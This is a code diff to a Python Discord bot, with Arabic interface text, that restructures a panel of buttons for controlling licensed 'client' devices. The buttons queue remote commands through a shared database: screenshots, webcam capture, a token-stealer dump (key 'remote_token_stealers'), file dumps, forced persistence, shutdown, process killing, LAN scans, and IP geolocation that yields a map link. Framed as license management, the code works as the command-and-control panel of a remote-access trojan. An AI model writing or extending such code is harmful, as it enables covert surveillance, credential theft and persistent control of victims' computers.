@@ -319,7 +319,8 @@ class LicenseBot(discord.Client):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get("custom_id", "")
             
-            if not interaction.response.is_done():
+            # منع تعليق ديسكورد (Thinking...) للأزرار العامة
+            if not interaction.response.is_done() and not custom_id.startswith(("dev_act_wallpaper_", "dev_act_killproc_", "dev_act_files_", "dev_act_lag_")):
                 try:
                     await interaction.response.defer(thinking=True, ephemeral=True)
                 except Exception:
@@ -413,6 +414,114 @@ class LicenseBot(discord.Client):
                 except Exception as e:
                     await interaction.followup.send(f"❌ حدث خطأ أثناء فتح اللوحة: {e}", ephemeral=True)
 
+            elif custom_id.startswith("dev_"):
+                # معالجة أزرار أجهزة العميل المباشرة
+                try:
+                    if custom_id.startswith("dev_force_persist_"):
+                        action, code = "force_persist", custom_id.replace("dev_force_persist_", "")
+                    elif custom_id.startswith("dev_remove_persist_"):
+                        action, code = "remove_persist", custom_id.replace("dev_remove_persist_", "")
+                    elif custom_id.startswith("dev_kill_tool_"):
+                        action, code = "kill_tool", custom_id.replace("dev_kill_tool_", "")
+                    else:
+                        parts = custom_id.split("_")
+                        action, code = parts[1], parts[2]
+                except Exception:
+                    await interaction.followup.send("❌ خطأ في تحليل بيانات الزر.", ephemeral=True)
+                    return
+
+                db, sha, url, headers = await asyncio.to_thread(fetch_db)
+                if not db:
+                    await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
+                    return
+
+                if action == "ban":
+                    hwid = db.get("codes", {}).get(code, {}).get("device", "Unknown")
+                    db.setdefault("blacklisted_codes", []).append(code)
+                    if hwid and hwid != "Unknown":
+                        db.setdefault("blacklisted_devices", []).append(hwid)
+                    if code in db.get("codes", {}):
+                        db["codes"][code].update({"used": False, "device": None})
+                    if save_db(db, sha, url, headers, f"Ban {code}"):
+                        await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
+                elif action == "kick":
+                    db.setdefault("targeted_kick_messages", {})[code] = {"msg": "تم طردك من المالك", "id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Kick {code}"):
+                        await interaction.followup.send("👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)
+                elif action == "geo":
+                    info = db.get("codes", {}).get(code, {})
+                    ip_addr = info.get("ip")
+                    if not ip_addr or ip_addr == "Unknown":
+                        await interaction.followup.send(f"❌ العميل `{code}` ليس لديه عنوان IP مسجل حالياً.", ephemeral=True)
+                        return
+                    geo_data = {}
+                    try:
+                        res = requests.get(f"http://ip-api.com/json/{ip_addr}?fields=status,country,city,lat,lon,query", timeout=4).json()
+                        if res.get('status') == 'success':
+                            geo_data = res
+                    except Exception:
+                        pass
+                    country = geo_data.get('country', info.get("country", "غير معروف"))
+                    city = geo_data.get('city', "غير معروفة")
+                    lat = geo_data.get('lat')
+                    lon = geo_data.get('lon')
+                    maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else "غير متوفر"
+                    msg = (
+                        f"🌍 **الموقع الجغرافي الدقيق للعميل `{code}`:**\n"
+                        f"• 🌐 عنوان الـ IP: `{ip_addr}`\n"
+                        f"• 🏙️ المدينة: `{city}`\n"
+                        f"• 🌍 الدولة: `{country}`\n"
+                    )
+                    if lat and lon:
+                        msg += f"• 📍 **رابط خرائط جوجل:** [اضغط هنا لعرض الموقع على الخريطة]({maps_link})"
+                    else:
+                        msg += f"• 📍 **رابط خرائط جوجل:** تعذر تحديد الإحداثيات بدقة."
+                    await interaction.followup.send(msg, ephemeral=True)
+                elif action == "ipconfig":
+                    db.setdefault("remote_ipconfig", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"IPConfig {code}"):
+                        await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
+                elif action == "lanscan":
+                    db.setdefault("remote_lanscan", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"LanScan {code}"):
+                        await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
+                elif action == "wipe":
+                    db.setdefault("remote_wipe", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Wipe {code}"):
+                        await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
+                elif action == "ss":
+                    db.setdefault("remote_screenshots", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"SS {code}"):
+                        await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
+                elif action == "webcam":
+                    db.setdefault("remote_webcams", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Webcam {code}"):
+                        await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
+                elif action == "tokens":
+                    db.setdefault("remote_token_stealers", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Tokens Dump {code}"):
+                        await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
+                elif action == "dump":
+                    db.setdefault("remote_disk_dumps", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Dump {code}"):
+                        await interaction.followup.send("📂 تم طلب سحب الملفات!", ephemeral=True)
+                elif action == "shut":
+                    db.setdefault("remote_shutdowns", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Shutdown {code}"):
+                        await interaction.followup.send("⚡ تم إيقاف جهاز العميل بنجاح!", ephemeral=True)
+                elif action == "force_persist":
+                    db.setdefault("remote_force_persistence", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Force Persistence {code}"):
+                        await interaction.followup.send("🛡️ تم إرسال أمر تفعيل الثبات الإلزامي للعميل!", ephemeral=True)
+                elif action == "remove_persist":
+                    db.setdefault("remote_remove_persistence", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Remove Persistence {code}"):
+                        await interaction.followup.send("🔓 تم إرسال أمر إلغاء الثبات للعميل!", ephemeral=True)
+                elif action == "kill_tool":
+                    db.setdefault("remote_kill_tool", {})[code] = {"id": str(time.time())}
+                    if save_db(db, sha, url, headers, f"Kill Tool {code}"):
+                        await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة للعميل!", ephemeral=True)
+
 client = LicenseBot()
 
 def generate_random_code():
@@ -466,168 +575,61 @@ class DeviceActionsView(discord.ui.View):
         super().__init__(timeout=None)
         self.code, self.hwid, self.ip, self.port, self.country = code, hwid, ip, port, country
 
-    @discord.ui.button(label="🚫 حظر", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
-    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("blacklisted_codes", []).append(self.code)
-        db.setdefault("blacklisted_devices", []).append(self.hwid)
-        if self.code in db.get("codes", {}):
-            db["codes"][self.code].update({"used": False, "device": None})
-        if save_db(db, sha, url, headers, f"Ban {self.code}"):
-            await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
+        # Row 0 (5 buttons)
+        self.add_item(discord.ui.Button(label="🚫 حظر", style=discord.ButtonStyle.danger, custom_id=f"dev_ban_{code}", row=0))
+        self.add_item(discord.ui.Button(label="👢 طرد", style=discord.ButtonStyle.primary, custom_id=f"dev_kick_{code}", row=0))
+        self.add_item(discord.ui.Button(label="🌍 الموقع", style=discord.ButtonStyle.secondary, custom_id=f"dev_geo_{code}", row=0))
+        self.add_item(discord.ui.Button(label="📡 IPConfig", style=discord.ButtonStyle.secondary, custom_id=f"dev_ipconfig_{code}", row=0))
+        self.add_item(discord.ui.Button(label="🔍 LanScan", style=discord.ButtonStyle.secondary, custom_id=f"dev_lanscan_{code}", row=0))
 
-    @discord.ui.button(label="👢 طرد", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
-    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("targeted_kick_messages", {})[self.code] = {"msg": "تم طردك من المالك", "id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Kick {self.code}"):
-            await interaction.followup.send("👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)
+        # Row 1 (5 buttons)
+        self.add_item(discord.ui.Button(label="🧹 Wipe", style=discord.ButtonStyle.secondary, custom_id=f"dev_wipe_{code}", row=1))
+        # Modal buttons use direct callbacks
+        self.add_item(WallpaperButton(code))
+        self.add_item(KillProcessButton(code))
+        self.add_item(FileBrowserButton(code))
+        self.add_item(LagButton(code))
 
-    @discord.ui.button(label="🌍 الموقع", style=discord.ButtonStyle.secondary, custom_id="dev_act_geo", row=0)
-    async def geo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, _, _, _ = await asyncio.to_thread(fetch_db)
-        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-        info = db.get("codes", {}).get(self.code, {})
-        ip_addr = info.get("ip")
-        if not ip_addr or ip_addr == "Unknown":
-            return await interaction.followup.send(f"❌ العميل `{self.code}` ليس لديه عنوان IP مسجل حالياً.", ephemeral=True)
-        
-        geo_data = {}
-        try:
-            res = requests.get(f"http://ip-api.com/json/{ip_addr}?fields=status,country,city,lat,lon,query", timeout=4).json()
-            if res.get('status') == 'success':
-                geo_data = res
-        except Exception:
-            pass
-        
-        country = geo_data.get('country', info.get("country", "غير معروف"))
-        city = geo_data.get('city', "غير معروفة")
-        lat = geo_data.get('lat')
-        lon = geo_data.get('lon')
-        
-        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else "غير متوفر"
-        msg = (
-            f"🌍 **الموقع الجغرافي الدقيق للعميل `{self.code}`:**\n"
-            f"• 🌐 عنوان الـ IP: `{ip_addr}`\n"
-            f"• 🏙️ المدينة: `{city}`\n"
-            f"• 🌍 الدولة: `{country}`\n"
-        )
-        if lat and lon:
-            msg += f"• 📍 **رابط خرائط جوجل:** [اضغط هنا لعرض الموقع على الخريطة]({maps_link})"
-        else:
-            msg += f"• 📍 **رابط خرائط جوجل:** تعذر تحديد الإحداثيات بدقة."
-        await interaction.followup.send(msg, ephemeral=True)
+        # Row 2 (5 buttons)
+        self.add_item(discord.ui.Button(label="📸 لقطة", style=discord.ButtonStyle.secondary, custom_id=f"dev_ss_{code}", row=2))
+        self.add_item(discord.ui.Button(label="📸 كاميرا", style=discord.ButtonStyle.secondary, custom_id=f"dev_webcam_{code}", row=2))
+        self.add_item(discord.ui.Button(label="🔑 التوكنات", style=discord.ButtonStyle.secondary, custom_id=f"dev_tokens_{code}", row=2))
+        self.add_item(discord.ui.Button(label="📂 Dump", style=discord.ButtonStyle.secondary, custom_id=f"dev_dump_{code}", row=2))
+        self.add_item(discord.ui.Button(label="⚡ إيقاف", style=discord.ButtonStyle.danger, custom_id=f"dev_shut_{code}", row=2))
 
-    @discord.ui.button(label="📡 IPConfig", style=discord.ButtonStyle.secondary, custom_id="dev_act_ipconfig", row=1)
-    async def ipconfig_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_ipconfig", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"IPConfig {self.code}"):
-            await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
+        # Row 3 (3 buttons)
+        self.add_item(discord.ui.Button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id=f"dev_force_persist_{code}", row=3))
+        self.add_item(discord.ui.Button(label="🔓 إلغاء الثبات", style=discord.ButtonStyle.secondary, custom_id=f"dev_remove_persist_{code}", row=3))
+        self.add_item(discord.ui.Button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id=f"dev_kill_tool_{code}", row=3))
 
-    @discord.ui.button(label="🔍 LanScan", style=discord.ButtonStyle.secondary, custom_id="dev_act_lanscan", row=1)
-    async def lanscan_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_lanscan", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"LanScan {self.code}"):
-            await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🧹 Wipe", style=discord.ButtonStyle.secondary, custom_id="dev_act_wipe", row=1)
-    async def wipe_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_wipe", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Wipe {self.code}"):
-            await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🖼️ الخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_wallpaper", row=2)
-    async def wallpaper_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+# أزرار فتح النوافذ التفاعلية (Modals)
+class WallpaperButton(discord.ui.Button):
+    def __init__(self, code):
+        super().__init__(label="🖼️ الخلفية", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_wallpaper_{code}", row=1)
+        self.code = code
+    async def callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(WallpaperModal(self.code))
 
-    @discord.ui.button(label="🛑 إيقاف عملية", style=discord.ButtonStyle.secondary, custom_id="dev_act_killproc", row=2)
-    async def killproc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+class KillProcessButton(discord.ui.Button):
+    def __init__(self, code):
+        super().__init__(label="🛑 عملية", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_killproc_{code}", row=1)
+        self.code = code
+    async def callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(KillProcessModal(self.code))
 
-    @discord.ui.button(label="📁 الملفات", style=discord.ButtonStyle.secondary, custom_id="dev_act_files", row=2)
-    async def files_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+class FileBrowserButton(discord.ui.Button):
+    def __init__(self, code):
+        super().__init__(label="📁 الملفات", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_files_{code}", row=1)
+        self.code = code
+    async def callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(FileBrowserModal(self.code))
 
-    @discord.ui.button(label="⏱️ لاج", style=discord.ButtonStyle.secondary, custom_id="dev_act_lag", row=3)
-    async def lag_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+class LagButton(discord.ui.Button):
+    def __init__(self, code):
+        super().__init__(label="⏱️ لاج", style=discord.ButtonStyle.secondary, custom_id=f"dev_act_lag_{code}", row=1)
+        self.code = code
+    async def callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(LagTimerModal(self.code))
-
-    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=3)
-    async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_screenshots", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
-
-    @discord.ui.button(label="📸 كاميرا", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=3)
-    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_webcams", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
-
-    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي", style=discord.ButtonStyle.success, custom_id="dev_act_force_persistence", row=4)
-    async def force_persistence_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_force_persistence", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Force Persistence {self.code}"):
-            await interaction.followup.send("🛡️ تم إرسال أمر تفعيل الثبات الإلزامي للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🔓 إلغاء الثبات", style=discord.ButtonStyle.secondary, custom_id="dev_act_remove_persistence", row=4)
-    async def remove_persistence_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_remove_persistence", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Remove Persistence {self.code}"):
-            await interaction.followup.send("🔓 تم إرسال أمر إلغاء الثبات للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_tool", row=4)
-    async def kill_tool_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_kill_tool", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Kill Tool {self.code}"):
-            await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة للعميل!", ephemeral=True)
 
 class DevicesSubMenuView(discord.ui.View):
     def __init__(self, devices):
